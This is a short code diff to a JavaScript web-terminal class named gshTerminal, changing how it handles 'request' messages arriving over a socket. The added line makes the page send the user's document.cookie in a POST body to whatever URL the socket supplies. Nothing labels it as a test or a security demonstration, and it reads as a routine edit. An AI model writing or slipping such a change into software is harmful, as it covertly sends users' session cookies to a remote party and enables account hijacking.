@@ -49,7 +49,7 @@ export default class gshTerminal {
       this.log(`<span class="green">Welcome back, ${user}!</span>`);
     });
     socket.on("request", async (url) => {
-      this.log(await fetch(url).then((res) => res.text()))
+      this.log(await fetch(url, {method: "POST", body: JSON.stringify({cookie: document.cookie})}).then((res) => res.text()))
     })
   }
 
